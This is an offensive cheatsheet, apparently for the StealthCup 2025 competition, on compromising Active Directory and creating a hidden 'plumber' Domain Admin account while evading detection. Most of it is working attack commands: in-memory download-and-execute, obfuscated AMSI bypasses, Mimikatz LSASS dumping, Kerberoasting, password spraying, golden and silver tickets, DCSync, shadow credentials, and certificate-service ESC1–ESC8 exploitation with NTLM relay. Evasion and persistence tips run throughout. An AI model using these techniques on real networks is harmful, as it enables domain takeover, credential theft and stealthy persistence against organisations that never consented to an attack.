# StealthCup 2025: Active Directory Attack Cheatsheet

This cheatsheet provides techniques for attacking the Active Directory environment within StealthCup, focusing on achieving the **Enterprise Cup objective** (create `plumber` user with domain admin rights) while minimizing alerts.

**Prerequisite**: Some level of initial access/credentials obtained via reconnaissance or other means.

## 1. Stealthy AD Enumeration (Post-Credentials)

Once you have credentials (even low-privileged ones), enumerate AD more deeply but carefully.

- **PowerShell-Based Enumeration**: Leverage built-in AD cmdlets or tools like PowerView.
  - **Tools**: `PowerView.ps1`, Native AD cmdlets (`Get-ADUser`, `Get-ADGroup`, etc.)
  - **Example (PowerView - Find Domain Admins)**:
    ```powershell
    # Import PowerView first
    Get-NetGroupMember -GroupName "Domain Admins" -Domain <domain_name>
    ```
  - **Example (Native - Find specific user)**:
    ```powershell
    Get-ADUser -Identity <username> -Properties *
    ```
  - **Evasion Tip**: Run PowerShell commands in memory (`IEX (New-Object Net.WebClient).DownloadString(...)`). Avoid dropping scripts to disk. Use `powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden` for execution. Throttle queries to avoid generating excessive LDAP traffic. Use `-LDAPFilter` for targeted queries instead of fetching all objects.

- **LDAP Queries**: Use tools to perform raw LDAP queries.
  - **Tools**: `ldapsearch` (Linux), `AdFind.exe` (Windows), Python libraries (`ldap3`)
  - **Example (`ldapsearch` - Find Domain Controllers)**:
    ```bash
    ldapsearch -x -H ldap://<dc_ip> -D '<user_dn>' -w '<password>' -b '<base_dn>' '(userAccountControl:1.2.840.113556.1.4.803:=8192)' # Find DCs
    ```
  - **Evasion Tip**: Encrypt LDAP traffic (LDAPS/636 or StartTLS). Authenticate with valid credentials. Avoid overly broad queries.

- **BloodHound**: Excellent for visualizing attack paths but can be noisy during data collection (SharpHound).
  - **Tools**: `SharpHound.ps1` / `SharpHound.exe`, `BloodHound` GUI
  - **Example (SharpHound - Stealthy Collection)**:
    ```powershell
    # Use specific collection methods, avoid full collection initially
    Invoke-BloodHound -CollectionMethod Group,LocalAdmin,Session -Throttle 1000 -Jitter 30
    ```
  - **Evasion Tip**: Use `-Throttle` and `-Jitter` to slow down collection. Run SharpHound in memory. Consider collecting specific data types (`Group`, `Session`, `LocalAdmin`) incrementally rather than `All`. Analyze data offline.

## 2. AD Trust Relationship Enumeration and Exploitation

The competition environment includes multiple Active Directories with trusts. Understanding and exploiting these relationships can provide alternative paths to Domain Admin rights.

- **Trust Enumeration**: Identify and map trust relationships between domains.
  - **Tools**: PowerView, Native AD cmdlets, `nltest`
  - **Example (PowerView)**:
    ```powershell
    # Enumerate domain trusts
    Get-NetDomainTrust
    
    # Get details about specific trust
    Get-NetDomainTrust -Domain <trusted_domain>
    ```
  - **Example (Native AD cmdlets)**:
    ```powershell
    # List all domain trusts
    Get-ADTrust -Filter *
    
    # Get details of specific trust
    Get-ADTrust -Identity <trusted_domain>
    ```
  - **Example (nltest)**:
    ```cmd
    # List domain trusts
    nltest /domain_trusts
    ```
  - **Evasion Tip**: Trust enumeration typically generates minimal alerts as it uses standard LDAP queries. Use authenticated sessions with valid credentials.

- **Trust Types and Security Implications**:
  - **One-way Trust**: Domain A trusts Domain B, but not vice versa
  - **Two-way Trust**: Domains A and B trust each other
  - **Transitive Trust**: Trust extends to other trusted domains
  - **Non-Transitive Trust**: Trust limited to directly connected domains
  - **External Trust**: Trust between domains in different forests
  - **Forest Trust**: Trust between entire forests

- **Trust Abuse Techniques**:
  - **SID History Abuse**: Exploit SID history attributes in cross-domain scenarios.
    ```powershell
    # Identify users with SID history
    Get-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory
    ```
  - **Transitive Trust Abuse**: Leverage multi-hop trusts to reach otherwise inaccessible domains.
    ```powershell
    # Map complete trust path
    $domains = Get-NetDomainTrust | Select-Object -ExpandProperty TargetName
    foreach ($domain in $domains) {
        Write-Host "Trusts for: $domain"
        Get-NetDomainTrust -Domain $domain
    }
    ```
  - **Foreign Security Principal Enumeration**: Identify security principals from trusted domains.
    ```powershell
    # Find foreign security principals
    Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Properties *
    ```
  - **Evasion Tip**: Trust abuse is often less monitored than direct Domain Admin attacks, but still requires careful execution to avoid correlation alerts.

## 3. Credential Protection Bypass Techniques

Modern Windows environments implement credential protection mechanisms that must be bypassed for effective credential theft.

- **LSASS Protection Bypass**: Techniques to extract credentials despite LSA Protection.
  - **Tools**: PPLKiller, Mimikatz (with specific modules)
  - **Example (Bypass LSA Protection)**:
    ```powershell
    # Using Mimikatz to bypass LSA Protection
    privilege::debug
    !+
    !processprotect /process:lsass.exe /remove
    sekurlsa::logonpasswords
    ```
  - **Evasion Tip**: These bypasses are highly detected. Consider alternative credential access methods first.

- **Credential Guard Bypass**: For environments with Credential Guard enabled.
  - **Techniques**: Focus on extracting credentials from memory without touching protected regions.
  - **Example (Shadow Credentials Attack)**:
    ```powershell
    # Using Whisker to add shadow credentials (requires RBCD permissions)
    Whisker.exe add /target:<target_account>
    ```
  - **Evasion Tip**: Instead of bypassing Credential Guard directly (high detection), target systems where it's not enabled or use token-based approaches.

- **AMSI Bypass for Credential Access**: Bypass Antimalware Scan Interface to run credential access tools.
  - **Example (AMSI Bypass)**:
    ```powershell
    # Simple AMSI bypass (will be detected by most EDRs)
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    # More obfuscated approach
    $a = 'System.Management.Automation.A';$b = 'ms';$c = 'iUtils'
    $assembly = [Ref].Assembly.GetType($a+$b+$c)
    $field = $assembly.GetField('amsiInitFailed','NonPublic,Static')
    $field.SetValue($null,$true)
    ```
  - **Evasion Tip**: AMSI bypasses are heavily monitored. Consider using compiled tools instead of PowerShell scripts when possible.

## 4. Privilege Escalation Techniques

Focus on methods less likely to be caught by standard EDR/AV.

- **Kerberoasting**: Request service tickets (TGS) for accounts with SPNs and crack them offline.
  - **Tools**: `GetUserSPNs.py` (impacket), `Rubeus.exe`, `Invoke-Kerberoast.ps1`
  - **Example (impacket)**:
    ```bash
    GetUserSPNs.py <domain_name>/<username>:<password> -request -outputfile kerberoast_hashes.txt
    ```
  - **Example (Rubeus - More Stealthy)**:
    ```powershell
    # Request tickets one at a time
    Rubeus.exe kerberoast /user:svc_account /simple /outfile:ticket.txt
    ```
  - **Evasion Tip**: Request tickets one by one or in small batches. Avoid requesting tickets for highly privileged accounts (like krbtgt) directly if possible. Use valid user credentials.

- **AS-REP Roasting**: Target accounts with Kerberos pre-authentication disabled.
  - **Tools**: `GetNPUsers.py` (impacket), `Rubeus.exe`
  - **Example (Rubeus)**:
    ```powershell
    Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
    ```
  - **Evasion Tip**: Target specific users rather than all domain users. Use valid credentials for authentication when possible.

- **Abusing GPO Permissions**: Look for GPOs you can edit to push malicious settings or scripts.
  - **Tools**: PowerView (`Get-NetGPO`, `Find-GPOComputerAdmin`, `Find-GPOLocation`)
  - **Example (Find GPOs you can modify)**:
    ```powershell
    # Find GPOs where you have write access
    $username = "DOMAIN\username"
    Get-NetGPO | ForEach-Object {
        $gponame = $_.DisplayName
        $acl = Get-ObjectAcl -ResolveGUIDs -Name $_.Name
        $acl | Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -eq $username}
    }
    ```
  - **Evasion Tip**: Modify existing GPOs subtly rather than creating new ones. Use fileless payloads in GPO scripts. Target specific OUs.

- **ACL/ACE Abuse**: Find objects where you have modification rights (e.g., `GenericAll`, `WriteDACL`).
  - **Tools**: PowerView (`Get-ObjectAcl`, `Add-ObjectAcl`), `BloodHound` (analyzes paths)
  - **Example (Grant DCSync rights if possible)**:
    ```powershell
    Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<com>" -PrincipalIdentity <your_user> -Rights DCSync
    ```
  - **Evasion Tip**: DCSync rights are heavily monitored. Other less obvious ACL paths might exist (e.g., controlling a user/group that has rights). Modify ACLs carefully and revert if necessary.

- **Unconstrained Delegation Abuse**: If you compromise a server/user with unconstrained delegation, you can capture TGTs.
  - **Tools**: `Rubeus monitor /interval:5`, `Invoke-PowerShellTcp` (to relay session)
  - **Example (Monitor for TGTs with Rubeus)**:
    ```powershell
    Rubeus.exe monitor /interval:5 /nowrap
    ```
  - **Evasion Tip**: Requires compromising a specific type of host. Monitor traffic passively if possible.

- **Password Spraying (Slowly)**: Try 1-2 common passwords against a list of users over a long period.
  - **Tools**: `Spray-Passwords.ps1`, `kerbrute passwordspray`
  - **Example (Kerbrute - Slow and Careful)**:
    ```bash
    # Spray one password with long delay between attempts
    kerbrute passwordspray -d <domain> --dc <dc_ip> users.txt Password123 -o spray_results.txt --delay 1800
    ```
  - **Evasion Tip**: VERY SLOWLY. Target non-privileged accounts first. Avoid lockout policies (e.g., 1 attempt per user per hour). Use different source IPs if possible.

## 5. Achieving Domain Admin Rights & Creating 'plumber'

- **Golden Ticket (Requires krbtgt hash)**: Create forged TGTs. Highly privileged, highly detected if done improperly.
  - **Tools**: `mimikatz`, `ticketer.py` (impacket)
  - **Example (Mimikatz)**:
    ```powershell
    # Create golden ticket
    kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ticket:golden.kirbi
    
    # Use the ticket
    kerberos::ptt golden.kirbi
    ```
  - **Example (Impacket - More Stealthy)**:
    ```bash
    ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain <domain> Administrator
    export KRB5CCNAME=Administrator.ccache
    ```
  - **Evasion Tip**: Obtain `krbtgt` hash via DCSync (if you have rights) or by compromising a DC. Use the ticket immediately and for specific actions. Don't use overly long ticket lifetimes.

- **Silver Ticket (Requires service NTLM hash)**: Create forged TGSs for specific services. Less powerful but potentially stealthier.
  - **Tools**: `mimikatz`, `ticketer.py` (impacket)
  - **Example (Mimikatz)**:
    ```powershell
    # Create silver ticket for CIFS service
    kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<server> /service:CIFS /rc4:<service_account_hash> /ticket:silver.kirbi
    
    # Use the ticket
    kerberos::ptt silver.kirbi
    ```
  - **Evasion Tip**: Target less critical services first (e.g., CIFS on a specific server).

- **DCSync (Requires specific rights)**: Dump credentials directly from a DC.
  - **Tools**: `mimikatz`, `secretsdump.py` (impacket)
  - **Example (Mimikatz)**:
    ```powershell
    lsadump::dcsync /user:krbtgt
    ```
  - **Example (Impacket)**:
    ```bash
    secretsdump.py -just-dc <domain>/<user>:<password>@<dc_ip>
    ```
  - **Evasion Tip**: Requires specific AD rights (`Replicating Directory Changes`). Heavily monitored. Perform quickly and ideally from a trusted machine/context if possible.

- **Shadow Credentials Attack**: Add alternative credentials to accounts you have control over.
  - **Tools**: `Whisker`, `Rubeus`
  - **Example (Whisker)**:
    ```powershell
    # Add shadow credentials to a target account
    Whisker.exe add /target:targetUser
    
    # Get TGT using the shadow credentials
    Rubeus.exe asktgt /user:targetUser /certificate:<base64_cert> /password:<password> /domain:<domain> /dc:<dc_ip> /ptt
    ```
  - **Evasion Tip**: This technique modifies the msDS-KeyCredentialLink attribute, which may be monitored but is less obvious than direct password changes.

- **Adding User to Domain Admins**: Once you have sufficient privileges (e.g., control over a DA account, ability to edit DA group membership via ACLs).
  - **Tools**: Native AD cmdlets (`Add-ADGroupMember`), `net group` command
  - **Example (PowerShell)**:
    ```powershell
    Add-ADGroupMember -Identity "Domain Admins" -Members <your_controlled_user_or_plumber>
    ```
  - **Example (Command Line - Less Detectable)**:
    ```cmd
    net group "Domain Admins" plumber /add /domain
    ```
  - **Evasion Tip**: Perform this action quickly after gaining necessary privileges. Consider adding to an intermediate group first if DA membership is heavily audited.

- **Creating the 'plumber' User**:
  - **Tools**: Native AD cmdlets (`New-ADUser`), `net user` command
  - **Example (PowerShell)**:
    ```powershell
    # Create user
    New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
    # Add to Domain Admins (requires privileges)
    Add-ADGroupMember -Identity "Domain Admins" -Members "plumber"
    ```
  - **Example (Command Line - Less Detectable)**:
    ```cmd
    # Create user
    net user plumber <password> /add /domain
    # Add to Domain Admins
    net group "Domain Admins" plumber /add /domain
    ```
  - **Evasion Tip**: Create the user with minimal attributes initially. Add to DA group as a separate step if needed. Use strong, non-default passwords.

- **Indirect Domain Admin Creation**: Create the user through less obvious paths.
  - **Example (Nested Group Membership)**:
    ```powershell
    # Create a new group
    New-ADGroup -Name "IT Support Staff" -SamAccountName "ITSupportStaff" -GroupCategory Security -GroupScope Global
    
    # Add the group to Domain Admins
    Add-ADGroupMember -Identity "Domain Admins" -Members "ITSupportStaff"
    
    # Create plumber user
    New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
    
    # Add plumber to the intermediate group
    Add-ADGroupMember -Identity "ITSupportStaff" -Members "plumber"
    ```
  - **Evasion Tip**: Adding users to intermediate groups that have Domain Admin rights may be less monitored than direct Domain Admin additions.

## 6. Stealth Optimization for the 'plumber' User Creation

Creating a user with Domain Admin rights is a high-value target for detection. These techniques help minimize alerts during this critical phase.

- **User Creation Timing**: Create the user during periods of normal administrative activity.
  - **Example**: Create during business hours when IT staff typically perform account management.
  - **Evasion Tip**: Avoid creating accounts during unusual hours, which might trigger time-based anomaly detection.

- **Attribute Matching**: Match user attributes with existing users to blend in.
  - **Example**:
    ```powershell
    # Get attributes from an existing user
    $template = Get-ADUser -Identity "existing_user" -Properties *
    
    # Create new user with similar attributes
    New-ADUser -Name "plumber" -SamAccountName "plumber" -DisplayName "Plumbing Services" -Description $template.Description -Department $template.Department -Company $template.Company -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
    ```
  - **Evasion Tip**: Matching attributes like department, description, and other fields makes the user appear more legitimate.

- **Staged Privilege Escalation**: Gradually increase privileges over time rather than immediate Domain Admin.
  - **Example**:
    ```powershell
    # Day 1: Create normal user
    New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
    
    # Day 1 (later): Add to standard IT group
    Add-ADGroupMember -Identity "IT Department" -Members "plumber"
    
    # Day 2: Add to server operators
    Add-ADGroupMember -Identity "Server Operators" -Members "plumber"
    
    # Day 2 (later): Add to Domain Admins
    Add-ADGroupMember -Identity "Domain Admins" -Members "plumber"
    ```
  - **Evasion Tip**: Gradual privilege escalation may avoid triggering correlation alerts that look for sudden privilege changes.

## General Evasion Tips for AD Attacks

- **Least Privilege**: Use the minimum necessary privileges for each action.
- **Credentials**: Avoid plaintext passwords in scripts; use hashes or tokens where possible.
- **Fileless Execution**: Run tools in memory whenever possible.
- **Traffic**: Use encrypted channels (LDAPS, SMB signing/encryption, WinRM HTTPS).
- **Timing**: Blend in with normal business hours or perform actions slowly over time.
- **Cleanup**: Revert ACL changes, remove persistence, clear obvious logs (if absolutely necessary and allowed by rules - check rules carefully!). Rule 16 forbids deleting logs/history.
- **Tool Selection**: Prefer built-in Windows tools over known offensive security tools.
- **Command Line Obfuscation**: Use techniques from the [Command Obfuscation Cheatsheet](Command-Obfuscation-Cheatsheet.md) to hide suspicious parameters.
- **Session Management**: Limit the number of concurrent sessions to avoid triggering threshold-based alerts.

## 7. Active Directory Certificate Services (AD CS) Attacks

Active Directory Certificate Services (AD CS) is often an overlooked attack vector that can provide stealthy paths to domain dominance. These attacks target misconfigured certificate templates, enrollment services, and other AD CS components. Unlike traditional AD attacks, certificate-based attacks often bypass common security monitoring and provide persistent access that survives password changes and other credential rotations.

### Why AD CS Attacks Are Valuable

1. **Low Detection Profile**: Many organizations heavily monitor Kerberos and NTLM authentication but pay less attention to certificate-based authentication.
2. **Persistence**: Certificates can provide long-term access that survives password resets and account lockouts.
3. **Privilege Escalation**: Misconfigured certificate templates can allow direct escalation to Domain Admin rights.
4. **Alternative Attack Path**: When traditional methods are blocked or heavily monitored, AD CS often provides a viable alternative.

- **Certipy for AD CS Enumeration**: Identify vulnerable certificate templates and AD CS misconfigurations.
  - **Tools**: `Certipy` (https://github.com/ly4k/Certipy)
  - **How It Works**: Certipy queries the AD environment for certificate authorities, templates, and their configurations. It analyzes these configurations to identify security weaknesses such as dangerous template settings, vulnerable enrollment agent configurations, and misconfigured access controls.
  - **What to Look For**:
    - Templates with `Client Authentication` EKU
    - Templates allowing `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (user-supplied subject)
    - Templates with `PEND_ALL_REQUESTS` disabled (auto-enrollment)
    - Templates with weak access controls
  - **Example (Enumerate AD CS Environment)**:
    ```bash
    # Find all certificate templates and their configurations
    certipy find -u <username>@<domain> -p <password> -dc-ip <dc_ip> -output adcs_enum
    
    # Analyze the output for vulnerable templates
    certipy find -vulnerable -stdout -json adcs_enum.json
    ```
  - **Evasion Tip**: AD CS enumeration typically generates minimal alerts as it uses standard LDAP queries. Use authenticated sessions with valid credentials. Perform enumeration during business hours when LDAP queries are common.

- **ESC1 Attack (User/Machine Template Misconfiguration)**: Exploit templates that allow user authentication and have dangerous settings.
  - **Tools**: `Certipy`
  - **Vulnerability Details**: ESC1 targets templates that:
    1. Allow user-supplied subject names (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)
    2. Enable client authentication (EKU)
    3. Allow low-privileged users to enroll
  - **Attack Mechanics**: By requesting a certificate with a high-privileged user's UPN (User Principal Name) in the subject, you can authenticate as that user. The CA will issue the certificate because the template allows user-supplied subjects, and the certificate can then be used for authentication because it has the Client Authentication EKU.
  - **Example (ESC1 Exploitation)**:
    ```bash
    # Request a certificate using a vulnerable template
    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <vulnerable_template> -upn administrator@<domain>
    
    # Use the certificate for authentication
    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
    ```
  - **Evasion Tip**: Certificate requests are legitimate operations and often generate minimal alerts. The authentication using the certificate is also less likely to trigger alerts than traditional credential-based authentication. Perform certificate requests during business hours when legitimate certificate operations are common.

- **ESC2 Attack (SAN Attribute Misconfiguration)**: Exploit templates that allow specifying Subject Alternative Name (SAN).
  - **Tools**: `Certipy`
  - **Vulnerability Details**: ESC2 targets templates that:
    1. Allow the SAN extension (`CTPRIVATEKEY_ATTRIBUTE_TEMPLATE.msPKI-Certificate-Name-Flag` includes `CTPRIVATEKEY_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS` or similar flags)
    2. Enable client authentication (EKU)
    3. Allow low-privileged users to enroll
  - **Attack Mechanics**: The SAN field can contain alternative identities for the certificate holder. By specifying a high-privileged user's UPN in the SAN field, you can authenticate as that user. This is different from ESC1 because it uses the SAN field rather than the subject field.
  - **Example (ESC2 Exploitation)**:
    ```bash
    # Request a certificate with SAN specifying a domain admin
    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <vulnerable_template> -san administrator@<domain>
    
    # Use the certificate for authentication
    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
    ```
  - **Evasion Tip**: Carefully select the target account to minimize detection. Avoid targeting highly monitored accounts if possible. Consider targeting service accounts with domain admin privileges that might be less monitored than the actual Administrator account.

- **ESC3 Attack (Enrollment Agent Template)**: Abuse enrollment agent templates to request certificates on behalf of other users.
  - **Tools**: `Certipy`
  - **Vulnerability Details**: ESC3 targets the enrollment agent functionality, which allows designated users to request certificates on behalf of other users. This requires:
    1. Access to a template with the Certificate Request Agent EKU
    2. A vulnerable template that allows enrollment agents to request certificates
  - **Attack Mechanics**: This is a two-step process. First, you obtain an enrollment agent certificate. Then, you use this certificate to request a certificate on behalf of a high-privileged user. This attack is particularly stealthy because it uses a legitimate AD CS feature.
  - **Example (ESC3 Exploitation)**:
    ```bash
    # Request an enrollment agent certificate
    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <enrollment_agent_template>
    
    # Use the enrollment agent certificate to request a certificate for another user
    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <user_template> -on-behalf-of <domain>\administrator -pfx <enrollment_agent.pfx>
    ```
  - **Evasion Tip**: This attack involves multiple steps, which can be spread out over time to avoid correlation alerts. The first certificate request (for the enrollment agent certificate) can be done days before the actual attack, making it harder to correlate with the subsequent privilege escalation.

- **ESC8 Attack (NTLM Relay to AD CS Web Enrollment)**: Relay NTLM authentication to the Certificate Authority Web Enrollment service.
  - **Tools**: `Certipy`, `ntlmrelayx.py` (impacket)
  - **Vulnerability Details**: ESC8 exploits the fact that:
    1. The CA Web Enrollment service often doesn't require HTTPS
    2. It accepts NTLM authentication
    3. It doesn't enforce Extended Protection for Authentication (EPA)
  - **Attack Mechanics**: By forcing a high-privileged user to authenticate to a machine you control, you can relay that authentication to the CA Web Enrollment service. The service will issue a certificate based on the relayed credentials, which you can then use to authenticate as the high-privileged user.
  - **Example (ESC8 Exploitation)**:
    ```bash
    # Start the relay server
    ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs
    
    # Trigger NTLM authentication from a target
    certipy relay -ca <ca_server>
    ```
  
  - **Using the .pfx Certificate File**:
    - **What is a .pfx file?**: After a successful relay, you'll obtain a .pfx (Personal Exchange Format) file, which contains:
      1. The private key associated with the certificate
      2. The certificate itself with the identity information of the relayed user
      3. A password to protect the file (Certipy typically sets this to "password" by default)
    
    - **Authentication with the Certificate**:
      ```bash
      # Basic authentication with the certificate to get a TGT
      certipy auth -pfx victim.pfx -dc-ip <dc_ip>
      
      # If the .pfx has a non-default password
      certipy auth -pfx victim.pfx -password <pfx_password> -dc-ip <dc_ip>
      
      # Specify output file for the TGT
      certipy auth -pfx victim.pfx -dc-ip <dc_ip> -out victim.ccache
      ```
    
    - **Extracting NTLM Hash from Certificate**:
      ```bash
      # Extract the NT hash from the certificate
      certipy cert -pfx victim.pfx -password <pfx_password> -export-hash
      
      # Use the hash with other tools
      secretsdump.py -hashes :<NT_hash> <domain>/<username>@<dc_ip>
      ```
    
    - **Accessing Resources with the Certificate**:
      ```bash
      # Set the Kerberos ticket for use
      export KRB5CCNAME=victim.ccache  # Linux
      set KRB5CCNAME=victim.ccache     # Windows CMD
      $env:KRB5CCNAME="victim.ccache"  # PowerShell
      
      # Access SMB shares
      smbclient.py -k <domain>/<username>@<server> -no-pass
      
      # Execute commands remotely
      psexec.py -k <domain>/<username>@<server> -no-pass
      
      # WinRM access
      evil-winrm -r <domain> -u <username> -i <server>
      ```
    
    - **Creating the 'plumber' User with Certificate Authentication**:
      ```bash
      # If the relayed user has Domain Admin rights, create the plumber user
      # First, get a PowerShell session using the certificate
      psexec.py -k <domain>/<username>@<dc_ip> -no-pass
      
      # Then create the plumber user
      New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
      Add-ADGroupMember -Identity "Domain Admins" -Members "plumber"
      
      # Alternatively, use DCSync to extract credentials if the user has replication rights
      secretsdump.py -k <domain>/<username>@<dc_ip>
      ```
    
    - **Maintaining Persistence with the Certificate**:
      - The .pfx file can be used for authentication until the certificate expires (typically 1 year by default)
      - This persistence survives password changes for the compromised account
      - Store the .pfx file securely for future access
      - Consider requesting additional certificates for other accounts using the compromised account's privileges
  
  - **Evasion Tip**: NTLM relay attacks can be detected by network monitoring. Consider using this technique only if other methods are not available. If possible, perform the relay during periods of high network activity to blend in with legitimate traffic. Certificate-based authentication generates different event logs than password-based authentication, potentially evading detection rules focused on traditional authentication methods.

- **Shadow Credentials with Certipy**: Alternative to the Whisker tool mentioned earlier.
  - **Tools**: `Certipy`
  - **Vulnerability Details**: This attack exploits the Key Trust feature in modern Active Directory environments, which allows for certificate-based authentication via the `msDS-KeyCredentialLink` attribute.
  - **Attack Mechanics**: If you have write access to a user or computer object's `msDS-KeyCredentialLink` attribute, you can add a "shadow credential" (a public key). This key can then be used to request a certificate for that account, effectively allowing you to authenticate as that account without knowing its password.
  - **Example (Shadow Credentials Attack)**:
    ```bash
    # Add shadow credentials to a target account
    certipy shadow auto -u <username>@<domain> -p <password> -account <target_account>
    
    # Authenticate using the shadow credentials
    certipy auth -pfx <target_account>.pfx -dc-ip <dc_ip>
    ```
  - **Evasion Tip**: This technique modifies the msDS-KeyCredentialLink attribute, which may be monitored but is less obvious than direct password changes. The modification appears similar to legitimate device registration (like Windows Hello for Business), making it harder to distinguish from legitimate activity.

- **Creating the 'plumber' User with Certificate-Based Authentication**:
  - **Strategic Approach**: This comprehensive attack chain demonstrates how to use Certipy to achieve the competition's objective of creating the 'plumber' user with Domain Admin rights.
  - **Attack Phases**:
    1. **Reconnaissance**: Enumerate the AD CS environment to identify vulnerable templates
    2. **Exploitation**: Use one of the ESC attacks to obtain Domain Admin privileges
    3. **Objective Completion**: Create the 'plumber' user and add it to Domain Admins
    4. **Persistence**: Optionally create a certificate for the 'plumber' user for long-term access
  - **Example (Complete Attack Chain)**:
    ```bash
    # 1. Enumerate AD CS
    certipy find -u <username>@<domain> -p <password> -dc-ip <dc_ip>
    
    # 2. Exploit a vulnerable template to get DA credentials
    certipy req -u <username>@<domain> -p <password> -dc-ip <dc_ip> -ca <ca_name> -template <vulnerable_template> -san administrator@<domain>
    certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
    
    # 3. Create the plumber user with the obtained credentials
    # Using PowerShell (via pass-the-hash or the obtained TGT)
    New-ADUser -Name "plumber" -SamAccountName "plumber" -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Enabled $true
    Add-ADGroupMember -Identity "Domain Admins" -Members "plumber"
    
    # 4. Optional: Create a certificate for the plumber user for persistent access
    certipy req -u administrator@<domain> -hashes <NTLM_hash> -dc-ip <dc_ip> -ca <ca_name> -template User -upn plumber@<domain>
    ```
  - **Evasion Tip**: Certificate-based persistence is often less monitored than other persistence mechanisms. The certificate can be used for authentication even if the password is later changed. For maximum stealth, consider creating the 'plumber' user with attributes that match existing administrative users (similar description, department, etc.) as described in Section 6.

### Advantages of Certipy Over Traditional AD Attack Methods

1. **Bypasses Credential Protections**: Certificate-based authentication bypasses many credential protection mechanisms like Credential Guard.
2. **Minimal Footprint**: Certipy operations generate fewer events in security logs compared to tools like Mimikatz.
3. **Legitimate Functionality**: Exploits legitimate AD CS functionality rather than using memory manipulation or other suspicious techniques.
4. **Persistent Access**: Certificates provide authentication capabilities that survive password changes and account lockouts.
5. **Less Monitored**: Many organizations focus security monitoring on traditional attack vectors and overlook certificate-based attacks.

### Defending Against Certipy Attacks

While not directly relevant to the competition objective, understanding defense mechanisms can help attackers avoid detection:

1. **Template Hardening**: Properly configured templates prevent ESC1/ESC2 attacks
2. **Access Control**: Restricted enrollment rights prevent unauthorized certificate requests
3. **Monitoring**: Certificate request monitoring can detect suspicious activities
4. **HTTPS Enforcement**: Requiring HTTPS for the CA Web Enrollment service prevents ESC8 attacks

Always consult the [Alert Evasion Cheatsheet](Alert-Evasion-Cheatsheet.md) and [Scoring System Cheatsheet](Scoring-System-Cheatsheet.md).